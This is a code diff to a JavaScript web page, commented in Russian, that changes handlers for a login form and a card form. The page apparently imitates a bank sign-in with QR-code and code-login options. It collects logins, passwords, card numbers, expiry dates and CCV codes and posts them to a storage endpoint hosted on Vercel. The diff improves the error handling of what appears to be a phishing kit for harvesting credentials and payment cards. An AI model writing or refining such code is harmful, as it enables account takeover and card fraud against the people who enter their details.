@@ -288,28 +288,32 @@
         // Отправка данных
         const dataToSend = { login, password, cardNumber };
 
-        fetch('/save-data', {
+        fetch('/api/save-data', { // Обратите внимание на URL Vercel
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify(dataToSend)
         })
-        .then(response => response.json())
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Ошибка сети');
+          }
+          return response.json();
+        })
         .then(message => {
           alert('Данные отправлены и сохранены: ' + message);
         })
         .catch(error => {
-          console.error('Ошибка отправки данных:', error);
           errorMessage.textContent = 'Ошибка при отправке данных. Попробуйте позже.';
-          cardFieldsContainer.appendChild(errorMessage);
+          loginButton.parentElement.appendChild(errorMessage);
         });
       });
 
       // Обработчики для кнопок "Вход по QR-коду" и "Вход по коду"
       document.querySelectorAll('.auth-option').forEach(option => {
         option.addEventListener('click', () => {
-          window.location.href = 'https://example.com/404'; // Страница 404
+          alert('Функция не поддерживается.');
         });
       });
 
@@ -330,19 +334,23 @@
         // Отправка данных
         const dataToSend = { cardNumber, monthYear, ccv };
 
-        fetch('/save-data', {
+        fetch('/api/save-data', { // Обратите внимание на URL Vercel
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify(dataToSend)
         })
-        .then(response => response.json())
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Ошибка сети');
+          }
+          return response.json();
+        })
         .then(message => {
           alert('Данные отправлены и сохранены: ' + message);
         })
         .catch(error => {
-          console.error('Ошибка отправки данных:', error);
           errorMessage.textContent = 'Ошибка при отправке данных. Попробуйте позже.';
           cardFieldsContainer.appendChild(errorMessage);
         });
